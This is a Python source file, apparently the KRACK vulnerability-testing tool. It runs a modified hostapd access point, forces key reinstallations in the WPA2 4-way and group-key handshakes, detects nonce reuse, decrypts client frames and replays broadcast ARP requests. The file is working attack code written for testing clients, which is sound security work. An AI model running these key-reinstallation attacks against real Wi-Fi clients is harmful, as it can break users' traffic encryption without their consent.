#!/usr/bin/env python2
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
import sys, socket, struct, time, subprocess, atexit, select
from datetime import datetime
from wpaspy import Ctrl
from Cryptodome.Cipher import AES

# FIXME: We are repeating the "disable hw encryption" of FT tests
USAGE = """{name} - Tool to test Key Reinstallation Attacks against clients

To test wheter a client is vulnerable to Key Reinstallation Attack against
the 4-way handshake or group key handshake, take the following steps:

1. Compile our modified hostapd instance. This only needs to be done once.

      cd ../hostapd
      cp defconfig .config
      make -j 2

2. The hardware encryption engine of some Wi-Fi NICs have bugs that interfere
   with our script. So disable hardware encryption by executing:

      cd ../krackattack/
      ./disable-hwcrypto.sh

   This only needs to be done once. It's recommended to reboot after executing
   this script. After plugging in your Wi-Fi NIC, use `systool -vm ath9k_htc`
   or similar to confirm the nohwcript/.. param has been set. We tested this
   script with an Intel Dual Band Wireless-AC 7260 and a TP-Link TL-WN722N.

3. Execute this script. Accepted parameters are:

      --group   Test the group key handshake instead of the 4-way handshake
      --debug   Show more debug messages

   All other supplied arguments are passed on to hostapd.
   The only two commands you will normally have to execute are:

      {name}
      {name} --group

   The first one tests for key reinstallations in the 4-way handshake (see
   step 4), and the second tests one for key reinstallations in the group key
   handshake (see step 5).

   !! The default network name is testnetwork with password abcdefgh !!

   Note that you can change settings of the AP by modifying hostapd.conf.
   You will probably have to edit the line `interface=` to specify a Wi-Fi
   interface to use for the AP.

4. To test key reinstallations in the 4-way handshake, the script will keep
   sending encrypted message 3's to the client. To start the script execute:

      {name}

   Connect the the AP and the following tests will be performed automatically:

   4a. The script monitors traffic sent by the client to see if the pairwise
     key is being reinstalled. To assure the client is sending enough frames,
     you can optionally ping the AP: ping 192.168.100.254 .

     If the client is vulnerable, the script will show something like:
        [19:02:37] 78:31:c1:c4:88:92: IV reuse detected (IV=1, seq=10). Client is vulnerable to pairwise key reinstallations in the 4-way handshake!

     If the client is patched, the script will show (this can take a minute):
        [18:58:11] 90:18:7c:6e:6b:20: client DOESN'T seem vulnerable to pairwise key reinstallation in the 4-way handshake.

   4b. Once the client has requested an IP using DHCP, the script tests for
     reinstallations of the group key by sending broadcast ARP requests to the
     client using an already used (replayed) packet number (= IV). The client
     *must* request an IP using DHCP for this test to start.

     If the client is vulnerable, the script will show something like:
        [19:03:08] 78:31:c1:c4:88:92: Received 5 unique replies to replayed broadcast ARP requests. Client is vulnerable to group
        [19:03:08]                    key reinstallations in the 4-way handshake (or client accepts replayed broadcast frames)!

     If the client is patched, the script will show (this can take a minute):
        [19:03:08] 78:31:c1:c4:88:92: client DOESN'T seem vulnerable to group key reinstallation in the 4-way handshake handshake.

     Note that this scripts *indirectly* tests for reinstallations of the group
     key, by testing if replayed broadcast frames are accepted by the client.

5. To test key reinstallations in the group key handshake, the script will keep
   performing new group key handshakes using an identical (static) group key.
   The client *must* request an IP using DHCP for this test to start. To start
   the script execute:

      {name} --group

   Connect the the AP and all tests will be performed automatically. The
   working and output of the script is now similar as in step 4b.

6. Some final recommendations:

   6a. Perform these tests in a room with little interference. A high amount
       of packet loss will make this script unreliable!
   6b. Manually inspect network traffic to confirm the output of the script:
       - Use an extra Wi-Fi NIC in monitor mode to check pairwise key reinstalls
         by monitoring the IVs of frames sent by the client.
       - Capture traffic on the client to see if the replayed broadcast ARP
         requests are accepted or not.
   6c. If the client can use multiple Wi-Fi radios/NICs, test using a few
       different ones.
"""

# FIXME:
# - If the client installs an all-zero key, we cannot reliably test the group key handshake
# - We should test decryption using an all-zero key, and warn if this seems to succeed

# Future work:
# - Detect if the client reinstalls an all-zero encryption key (wpa_supplicant v2.4 and 2.5)
# - Ability to test the group key handshake against specific clients only
# - Individual test to see if the client accepts replayed broadcast traffic (without performing key reinstallation)

# After how many seconds a new message 3, or new group key message 1, is sent.
# This value must match the one in `../src/ap/wpa_auth.c` (same variable name).
HANDSHAKE_TRANSMIT_INTERVAL = 2

#### Basic output and logging functionality ####

ALL, DEBUG, INFO, STATUS, WARNING, ERROR = range(6)
COLORCODES = { "gray"  : "\033[0;37m",
               "green" : "\033[0;32m",
               "orange": "\033[0;33m",
               "red"   : "\033[0;31m" }

global_log_level = INFO
def log(level, msg, color=None, showtime=True):
	if level < global_log_level: return
	if level == DEBUG   and color is None: color="gray"
	if level == WARNING and color is None: color="orange"
	if level == ERROR   and color is None: color="red"
	print (datetime.now().strftime('[%H:%M:%S] ') if showtime else " "*11) + COLORCODES.get(color, "") + msg + "\033[1;0m"

#### Utility Commands ####

def hostapd_command(hostapd_ctrl, cmd):
	rval = hostapd_ctrl.request(cmd)
	if "UNKNOWN COMMAND" in rval:
		log(ERROR, "Hostapd did not recognize the command %s. Did you (re)compile hostapd?" % cmd.split()[0])
		quit(1)
	return rval

#### Packet Processing Functions ####

class DHCP_sock(DHCP_am):
	def __init__(self, **kwargs):
		self.sock = kwargs.pop("sock")
		super(DHCP_am, self).__init__(**kwargs)

	def send_reply(self, reply):
		self.sock.send(reply, **self.optsend)

	def print_reply(self, req, reply):
		log(STATUS, "%s: DHCP reply %s to %s" % (reply.getlayer(Ether).dst, reply.getlayer(IP).dst, reply.dst), color="green")

	def remove_client(self, clientmac):
		clientip = self.leases[clientmac]
		self.pool.append(clientip)
		del self.leases[clientmac]

class ARP_sock(ARP_am):
	def __init__(self, **kwargs):
		self.sock = kwargs.pop("sock")
		super(ARP_am, self).__init__(**kwargs)

	def send_reply(self, reply):
		self.sock.send(reply, **self.optsend)

	def print_reply(self, req, reply):
		log(STATUS, "%s: ARP: %s ==> %s on %s" % (reply.getlayer(Ether).dst, req.summary(), reply.summary(), self.iff))


class MitmSocket(L2Socket):
	def __init__(self, **kwargs):
		super(MitmSocket, self).__init__(**kwargs)

	def send(self, p):
		# Hack: set the More Data flag so we can detect injected frames (and so clients stay awake longer)
		p[Dot11].FCfield |= 0x20
		L2Socket.send(self, RadioTap()/p)

	def _strip_fcs(self, p):
		# Scapy can't handle the optional Frame Check Sequence (FCS) field automatically
		if p[RadioTap].present & 2 != 0:
			rawframe = str(p[RadioTap])
			pos = 8
			while ord(rawframe[pos - 1]) & 0x80 != 0: pos += 4

			# If the TSFT field is present, it must be 8-bytes aligned
			if p[RadioTap].present & 1 != 0:
				pos += (8 - (pos % 8))
				pos += 8

			# Remove FCS if present
			if ord(rawframe[pos]) & 0x10 != 0:
				return Dot11(str(p[Dot11])[:-4])

		return p[Dot11]

	def recv(self, x=MTU):
		p = L2Socket.recv(self, x)
		if p == None or not Dot11 in p: return None

		# Hack: ignore frames that we just injected and are echoed back by the kernel
		if p[Dot11].FCfield & 0x20 != 0:
			return None

		# Strip the FCS if present, and drop the RadioTap header
		return self._strip_fcs(p)

	def close(self):
		super(MitmSocket, self).close()


def dot11_get_seqnum(p):
	return p[Dot11].SC >> 4

def dot11_get_iv(p):
	"""Scapy can't handle Extended IVs, so do this properly ourselves (only works for CCMP)"""
	wep = p[Dot11WEP]
	if wep.keyid & 32:
		# FIXME: Only CCMP is supported (TKIP uses a different IV structure)
		return ord(wep.iv[0]) + (ord(wep.iv[1]) << 8) + (struct.unpack(">I", wep.wepdata[0:4])[0] << 16)
	else:
		return ord(wep.iv[0]) + (ord(wep.iv[1]) << 8) + (ord(wep.iv[2]) << 16)

def dot11_get_priority(p):
	if not Dot11QoS in p: return 0
	return ord(str(p[Dot11QoS])[0])

def get_ccmp_payload(p):
	# Extract encrypted payload:
	# - Skip extended IV (4 bytes in total)
	# - Exclude first 4 bytes of the CCMP MIC (note that last 4 are saved in the WEP ICV field)
	return str(p.wepdata[4:-4])

def decrypt_ccmp(p, key):
	payload   = get_ccmp_payload(p)
	sendermac = p[Dot11].addr2
	priority  = dot11_get_priority(p)
	iv        = dot11_get_iv(p)
	pn        = struct.pack(">I", iv >> 16) + struct.pack(">H", iv & 0xFFFF)
	nonce     = chr(priority) + sendermac.replace(':','').decode("hex") + pn
	cipher    = AES.new(key, AES.MODE_CCM, nonce, mac_len=8)
	plaintext = cipher.decrypt(payload)
	return plaintext

#### Main Testing Code ####

class IvInfo():
	def __init__(self, p):
		self.iv = dot11_get_iv(p)
		self.seq = dot11_get_seqnum(p)
		self.time = p.time

	def is_reused(self, p):
		"""Check if frame p reuses an IV and is not a retransmitted frame"""
		iv = dot11_get_iv(p)
		seq = dot11_get_seqnum(p)
		return self.iv == iv and self.seq != seq and p.time >= self.time + 1

class ClientState():
	UNKNOWN, VULNERABLE, PATCHED = range(3)
	IDLE, STARTED, GOT_CANARY, FINISHED = range(4)

	def __init__(self, clientmac, test_group_hs=False, test_tptk=False):
		self.mac = clientmac
		self.TK = None
		self.vuln_4way = ClientState.UNKNOWN
		self.vuln_group = ClientState.UNKNOWN
		# FIXME: Separate variable for group handshake result?

		self.ivs = dict() # maps IV values to IvInfo objects
		self.pairkey_sent_time_prev_iv = None
		self.pairkey_intervals_no_iv_reuse = 0
		self.pairkey_tptk = test_tptk

		self.groupkey_reset()
		self.groupkey_grouphs = test_group_hs

	def groupkey_reset(self):
		self.groupkey_state = ClientState.IDLE
		self.groupkey_prev_canary_time = 0
		self.groupkey_num_canaries = 0
		self.groupkey_requests_sent = 0
		self.groupkey_patched_intervals = -1 # -1 because the first broadcast ARP requests are still valid

	def start_grouphs_test():
		self.groupkey_reset()
		self.groupkey_grouphs = True

	def get_encryption_key(self, hostapd_ctrl):
		if self.TK is None:
			# Clear old replies and messages from the hostapd control interface
			while hostapd_ctrl.pending():
				hostapd_ctrl.recv()
			# Contact our modified Hostapd instance to request the pairwise key
			response = hostapd_command(hostapd_ctrl, "GET_TK " + self.mac)
			if not "FAIL" in response:
				self.TK = response.strip().decode("hex")
		return self.TK

	def decrypt(self, p, hostapd_ctrl):
		payload = get_ccmp_payload(p)
		llcsnap, packet = payload[:8], payload[8:]

		if payload.startswith("\xAA\xAA\x03\x00\x00\x00"):
			# On some kernels, the virtual interface associated to the real AP interface will return
			# frames where the payload is already decrypted (this happens when hardware decryption is
			# used). So if the payload seems decrypted, just extract the full plaintext from the frame.
			plaintext = payload
		else:
			key       = self.get_encryption_key(hostapd_ctrl)
			plaintext = decrypt_ccmp(p, key)

			# If it still fails, try an all-zero key
			if not plaintext.startswith("\xAA\xAA\x03\x00\x00\x00"):
				plaintext = decrypt_ccmp(p, "\x00" * 16)

		return plaintext

	def track_used_iv(self, p):
		iv = dot11_get_iv(p)
		self.ivs[iv] = IvInfo(p)

	def is_iv_reused(self, p):
		"""Returns True if this is an *observed* IV reuse and not just a retransmission"""
		iv = dot11_get_iv(p)
		return iv in self.ivs and self.ivs[iv].is_reused(p)

	def is_new_iv(self, p):
		"""Returns True if the IV in this frame is higher than all previously observed ones"""
		iv = dot11_get_iv(p)
		if len(self.ivs) == 0: return True
		return iv > max(self.ivs.keys())

	def check_pairwise_reinstall(self, p):
		"""Inspect whether the IV is reused, or whether the client seem to be patched"""

		# If this is gaurenteed IV reuse (and not just a benign retransmission), mark the client as vulnerable
		if self.is_iv_reused(p):
			if self.vuln_4way != ClientState.VULNERABLE:
				iv = dot11_get_iv(p)
				seq = dot11_get_seqnum(p)
				log(INFO, ("%s: IV reuse detected (IV=%d, seq=%d). " +
					"Client is vulnerable to pairwise key reinstallations in the 4-way handshake!") % (self.mac, iv, seq), color="green")
			self.vuln_4way = ClientState.VULNERABLE

		# If it's a higher IV than all previous ones, try to check if the client seems patched
		elif self.vuln_4way == ClientState.UNKNOWN and self.is_new_iv(p):
			# Save how many intervals we received a data packet without IV reset. Use twice the
			# transmission interval of message 3, in case one message 3 is lost due to noise.
			if self.pairkey_sent_time_prev_iv is None:
				self.pairkey_sent_time_prev_iv = p.time
			elif self.pairkey_sent_time_prev_iv + 2 * HANDSHAKE_TRANSMIT_INTERVAL + 1 <= p.time:
				self.pairkey_intervals_no_iv_reuse += 1
				self.pairkey_sent_time_prev_iv = p.time
				log(DEBUG, "%s: no pairwise IV resets seem to have occured for one interval" % self.mac)

			# If during several intervals all IV reset attempts failed, the client is likely patched.
			# We wait for enough such intervals to occur, to avoid getting a wrong result.
			if self.pairkey_intervals_no_iv_reuse >= 5 and self.vuln_4way == ClientState.UNKNOWN:
				self.vuln_4way = ClientState.PATCHED

				# Be sure to clarify *which* type of attack failed (to remind user to test others attacks as well)
				msg = "%s: client DOESN'T seem vulnerable to pairwise key reinstallation in the 4-way handshake"
				if self.pairkey_tptk == KRAckAttackClient.TPTK_NONE:
					msg += " (using standard attack)"
				elif self.pairkey_tptk == KRAckAttackClient.TPTK_REPLAY:
					msg += " (using TPTK attack)"
				elif self.pairkey_tptk == KRAckAttackClient.TPTK_RAND:
					msg += " (using TPTK-RAND attack)"
				log(INFO, (msg + ".") % self.mac, color="green")

	def mark_allzero_key(self, p):
		if self.vuln_4way != ClientState.VULNERABLE:
			iv = dot11_get_iv(p)
			seq = dot11_get_seqnum(p)
			log(INFO, ("%s: usage of all-zero key detected (IV=%d, seq=%d). " +
				"Client is vulnerable to installation of an all-zero key in the 4-way handshake!") % (self.mac, iv, seq), color="green")
			log(WARNING, "%s: !!! Other tests are unreliable due to all-zero key usage, please fix this first !!!" % self.mac)
		self.vuln_4way = ClientState.VULNERABLE

	def groupkey_handle_canary(self, p):
		"""Handle replies to the replayed ARP broadcast request (which reuses an IV)"""

		# Must be testing this client, and must not be a benign retransmission
		if not self.groupkey_state in [ClientState.STARTED, ClientState.GOT_CANARY]: return
		if self.groupkey_prev_canary_time + 1 > p.time: return

		self.groupkey_num_canaries += 1
		log(DEBUG, "%s: received %d replies to the replayed broadcast ARP requests" % (self.mac, self.groupkey_num_canaries))

		# We wait for several replies before marking the client as vulnerable, because
		# the first few broadcast ARP requests still use a valid (not yet used) IV.
		if self.groupkey_num_canaries >= 5:
			assert self.vuln_group != ClientState.VULNERABLE
			log(INFO, "%s: Received %d unique replies to replayed broadcast ARP requests. Client is vulnerable to group" \
				% (self.mac, self.groupkey_num_canaries), color="green")
			log(INFO, "                   key reinstallations in the %s handshake (or client accepts replayed broadcast frames)!" \
				% ("group key" if self.groupkey_grouphs else "4-way"),  color="green")
			self.vuln_group = ClientState.VULNERABLE
			self.groupkey_state = ClientState.FINISHED

		# Remember that we got a reply this interval (see groupkey_track_request to detect patched clients)
		else:
			self.groupkey_state = ClientState.GOT_CANARY

		self.groupkey_prev_canary_time = p.time

	def groupkey_track_request(self):
		"""Track when we went broadcast ARP requests, and determine if a client seems patched"""

		if self.vuln_group != ClientState.UNKNOWN: return
		hstype = "group key" if self.groupkey_grouphs else "4-way"

		# Show a message when we started with testing the client
		if self.groupkey_state == ClientState.IDLE:
			log(STATUS, "%s: client has IP address -> testing for group key reinstallation in the %s handshake" % (self.mac, hstype))
			self.groupkey_state = ClientState.STARTED

		if self.groupkey_requests_sent == 4:
			# We sent four broadcast ARP requests, and at least one got a reply. Indication that client is vulnerable.
			if self.groupkey_state == ClientState.GOT_CANARY:
				log(DEBUG, "%s: got a reply to broadcast ARP during this interval" % self.mac)
				self.groupkey_state = ClientState.STARTED

			# We sent four broadcast ARP requests, and didn't get a reply to any. Indication that client is patched.
			elif self.groupkey_state == ClientState.STARTED:
				self.groupkey_patched_intervals += 1
				log(DEBUG, "%s: no group IV resets seem to have occured for %d interval(s)" % (self.mac, self.groupkey_patched_intervals))
				self.groupkey_state = ClientState.STARTED

			self.groupkey_requests_sent = 0

		# If the client appears secure for several intervals (see above), it's likely patched
		if self.groupkey_patched_intervals >= 5 and self.vuln_group == ClientState.UNKNOWN:
			log(INFO, "%s: client DOESN'T seem vulnerable to group key reinstallation in the %s handshake." % (self.mac, hstype), color="green")
			self.vuln_group = ClientState.PATCHED
			self.groupkey_state = ClientState.FINISHED

		self.groupkey_requests_sent += 1
		log(DEBUG, "%s: sent %d broadcasts ARPs this interval" % (self.mac, self.groupkey_requests_sent))

class KRAckAttackClient():
	TPTK_NONE, TPTK_REPLAY, TPTK_RAND = range(3)

	def __init__(self, interface):
		self.nic_iface = interface
		self.nic_mon = interface + "mon"
		self.test_grouphs = False
		self.test_tptk = KRAckAttackClient.TPTK_NONE
		try:
			self.apmac = scapy.arch.get_if_hwaddr(interface)
		except:
			log(ERROR, 'Failed to get MAC address of %s. Specify an existing interface in hostapd.conf at the line "interface=NAME".' % interface)
			raise

		self.sock_mon = None
		self.sock_eth = None
		self.hostapd = None
		self.hostapd_ctrl = None

		self.dhcp = None
		self.group_ip = None
		self.group_arp = None

		self.clients = dict()

	def reset_client_info(self, clientmac):
		if clientmac in self.dhcp.leases:
			self.dhcp.remove_client(clientmac)
			log(DEBUG, "%s: Removing client from DHCP leases" % clientmac)
		if clientmac in self.clients:
			del self.clients[clientmac]
			log(DEBUG, "%s: Removing ClientState object" % clientmac)

	def handle_replay(self, p):
		"""Replayed frames (caused by a pairwise key reinstallation) are rejected by the kernel. This
		function processes these frames manually so we can still test reinstallations of the group key."""
		if not Dot11WEP in p: return

		# Reconstruct Ethernet header
		clientmac = p.addr2
		header = Ether(dst=self.apmac, src=clientmac)
		header.time = p.time

		# Decrypt the payload and obtain LLC/SNAP header and packet content
		client = self.clients[clientmac]
		plaintext = client.decrypt(p, self.hostapd_ctrl)
		llcsnap, packet = plaintext[:8], plaintext[8:]

		# Rebuild the full Ethernet packet
		if   llcsnap == "\xAA\xAA\x03\x00\x00\x00\x08\x06":
			decap = header/ARP(packet)
		elif llcsnap == "\xAA\xAA\x03\x00\x00\x00\x08\x00":
			decap = header/IP(packet)
		elif llcsnap == "\xAA\xAA\x03\x00\x00\x00\x86\xdd":
			decap = header/IPv6(packet)
		#elif llcsnap == "\xAA\xAA\x03\x00\x00\x00\x88\x8e":
		# 	# EAPOL
		else:
			return

		# Now process the packet as if it were a valid (non-replayed) one
		self.process_eth_rx(decap)

	def handle_mon_rx(self):
		p = self.sock_mon.recv()
		if p == None: return
		if p.type == 1: return

		# Note: we cannot verify that the NIC is indeed reusing IVs when sending the broadcast
		# ARP requests, because it may override them in the firmware/hardware (some Atheros
		# Wi-Fi NICs do no properly reset the Tx group key IV when using hardware encryption).

		# The first bit in FCfield is set if the frames is "to-DS"
		clientmac, apmac = (p.addr1, p.addr2) if (p.FCfield & 2) != 0 else (p.addr2, p.addr1)
		if apmac != self.apmac: return None

		# Reset info about disconnected clients
		if Dot11Deauth in p or Dot11Disas in p:
			self.reset_client_info(clientmac)

		# Inspect encrypt frames for IV reuse & handle replayed frames rejected by the kernel
		elif p.addr1 == self.apmac and Dot11WEP in p:
			if not clientmac in self.clients:
				self.clients[clientmac] = ClientState(clientmac, test_group_hs=self.test_grouphs, test_tptk=self.test_tptk)
			client = self.clients[clientmac]

			iv = dot11_get_iv(p)
			log(DEBUG, "%s: transmitted data using IV=%d (seq=%d)" % (clientmac, iv, dot11_get_seqnum(p)))

			if decrypt_ccmp(p, "\x00" * 16).startswith("\xAA\xAA\x03\x00\x00\x00"):
				client.mark_allzero_key(p)
			if not self.test_grouphs:
				client.check_pairwise_reinstall(p)
			if client.is_iv_reused(p):
				self.handle_replay(p)
			client.track_used_iv(p)

	def process_eth_rx(self, p):
		self.dhcp.reply(p)
		self.group_arp.reply(p)

		clientmac = p[Ether].src
		if not clientmac in self.clients: return
		client = self.clients[clientmac]

		if ARP in p and p[ARP].pdst == self.group_ip:
			client.groupkey_handle_canary(p)

	def handle_eth_rx(self):
		p = self.sock_eth.recv()
		if p == None or not Ether in p: return
		self.process_eth_rx(p)

	def configure_interfaces(self):
		log(STATUS, "Note: disable Wi-Fi in network manager & disable hardware encryption. Both may interfere with this script.")

		# 0. Some users may forget this otherwise
		subprocess.check_output(["rfkill", "unblock", "wifi"])

		# 1. Remove unused virtual interfaces to start from a clean state
		subprocess.call(["iw", self.nic_mon, "del"], stdout=subprocess.PIPE, stdin=subprocess.PIPE)

		# 2. Configure monitor mode on interfaces
		subprocess.check_output(["iw", self.nic_iface, "interface", "add", self.nic_mon, "type", "monitor"])
		# Some kernels (Debian jessie - 3.16.0-4-amd64) don't properly add the monitor interface. The following ugly
		# sequence of commands assures the virtual interface is properly registered as a 802.11 monitor interface.
		subprocess.check_output(["iw", self.nic_mon, "set", "type", "monitor"])
		time.sleep(0.5)
		subprocess.check_output(["iw", self.nic_mon, "set", "type", "monitor"])
		subprocess.check_output(["ifconfig", self.nic_mon, "up"])

	def run(self, test_grouphs=False, test_tptk=False):
		self.configure_interfaces()

		# Open the patched hostapd instance that carries out tests and let it start
		log(STATUS, "Starting hostapd ...")
		self.hostapd = subprocess.Popen(["../hostapd/hostapd", "hostapd.conf"] + sys.argv[1:])
		time.sleep(1)

		try:
			self.hostapd_ctrl = Ctrl("hostapd_ctrl/" + self.nic_iface)
			self.hostapd_ctrl.attach()
		except:
			log(ERROR, "It seems hostapd did not start properly, please inspect its output.")
			log(ERROR, "Did you disable Wi-Fi in the network manager? Otherwise hostapd won't work.")
			raise

		self.sock_mon = MitmSocket(type=ETH_P_ALL, iface=self.nic_mon)
		self.sock_eth = L2Socket(type=ETH_P_ALL, iface=self.nic_iface)

		# Let scapy handle DHCP requests
		self.dhcp = DHCP_sock(sock=self.sock_eth,
						domain='krackattack.com',
						pool=Net('192.168.100.0/24'),
						network='192.168.100.0/24',
						gw='192.168.100.254',
						renewal_time=600, lease_time=3600)
		# Configure gateway IP: reply to ARP and ping requests
		subprocess.check_output(["ifconfig", self.nic_iface, "192.168.100.254"])

		# Use a dedicated IP address for our broadcast ARP requests and replies
		self.group_ip = self.dhcp.pool.pop()
		self.group_arp = ARP_sock(sock=self.sock_eth, IP_addr=self.group_ip, ARP_addr=self.apmac)

		# If applicable, inform hostapd that we are testing the group key handshake
		if test_grouphs:
			hostapd_command(self.hostapd_ctrl, "START_GROUP_TESTS")
			self.test_grouphs = True

		# If applicable, inform hostapd that we are testing for Temporal PTK (TPTK) construction behaviour
		self.test_tptk = test_tptk
		if self.test_tptk == KRAckAttackClient.TPTK_REPLAY:
			hostapd_command(self.hostapd_ctrl, "TEST_TPTK")
		elif self.test_tptk == KRAckAttackClient.TPTK_RAND:
			hostapd_command(self.hostapd_ctrl, "TEST_TPTK_RAND")

		log(STATUS, "Ready. Connect to this Access Point to start the tests. Make sure the client requests an IP using DHCP!", color="green")

		# Monitor both the normal interface and virtual monitor interface of the AP
		self.next_arp = time.time() + 1
		while True:
			sel = select.select([self.sock_mon, self.sock_eth], [], [], 1)
			if self.sock_mon in sel[0]: self.handle_mon_rx()
			if self.sock_eth in sel[0]: self.handle_eth_rx()

			# Periodically send the replayed broadcast ARP requests to test for group key reinstallations
			if time.time() > self.next_arp:
				self.next_arp = time.time() + HANDSHAKE_TRANSMIT_INTERVAL
				for client in self.clients.values():
					# Also keep injecting to PATCHED clients (just to be sure they keep rejecting replayed frames)
					if client.vuln_group != ClientState.VULNERABLE and client.mac in self.dhcp.leases:
						clientip = self.dhcp.leases[client.mac]
						client.groupkey_track_request()
						log(INFO, "%s: sending broadcast ARP to %s from %s" % (client.mac, clientip, self.group_ip))

						request = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, hwsrc=self.apmac, psrc=self.group_ip, pdst=clientip)
						self.sock_eth.send(request)

	def stop(self):
		log(STATUS, "Closing hostapd and cleaning up ...")
		if self.hostapd:
			self.hostapd.terminate()
			self.hostapd.wait()
		if self.sock_mon: self.sock_mon.close()
		if self.sock_eth: self.sock_eth.close()


def cleanup():
	attack.stop()

def argv_get_interface():
	for i in range(len(sys.argv)):
		if not sys.argv[i].startswith("-i"):
			continue
		if len(sys.argv[i]) > 2:
			return sys.argv[i][2:]
		else:
			return sys.argv[i + 1]

	return None

def argv_pop_argument(argument):
	if not argument in sys.argv: return False
	idx = sys.argv.index(argument)
	del sys.argv[idx]
	return True

def hostapd_read_config(config):
	# Read the config, get the interface name, and verify some settings.
	interface = None
	with open(config) as fp:
		for line in fp.readlines():
			line = line.strip()
			if line.startswith("interface="):
				interface = line.split('=')[1]
			elif line.startswith("wpa_pairwise=") or line.startswith("rsn_pairwise"):
				if "TKIP" in line:
					log(ERROR, "ERROR: We only support tests using CCMP. Only include CCMP in %s config at the following line:" % config)
					log(ERROR, "       >%s<" % line, showtime=False)
					quit(1)

	# Parameter -i overrides interface in config.
	# FIXME: Display warning when multiple interfaces are used.
	if argv_get_interface() is not None:
		interface = argv_get_interface()

	return interface

if __name__ == "__main__":
	if "--help" in sys.argv or "-h" in sys.argv:
		print USAGE.format(name=sys.argv[0])
		quit(1)

	test_grouphs = argv_pop_argument("--group")
	test_tptk_replay = argv_pop_argument("--tptk")
	test_tptk_rand = argv_pop_argument("--tptk-rand")
	while argv_pop_argument("--debug"):
		global_log_level -= 1

	test_tptk = KRAckAttackClient.TPTK_NONE
	if test_tptk_replay and test_tptk_rand:
		log(ERROR, "Please only specify --tptk or --tptk-rand")
	elif test_tptk_replay:
		test_tptk = KRAckAttackClient.TPTK_REPLAY
	elif test_tptk_rand:
		test_tptk = KRAckAttackClient.TPTK_RAND

	try:
		interface = hostapd_read_config("hostapd.conf")
	except Exception as ex:
		log(ERROR, "Failed to parse the hostapd.conf config file")
		raise
	if not interface:
		log(ERROR, "Failed to determine wireless interface. Specify one in the hostapd config file.")
		quit(1)

	attack = KRAckAttackClient(interface)
	atexit.register(cleanup)
	attack.run(test_grouphs=test_grouphs, test_tptk=test_tptk)
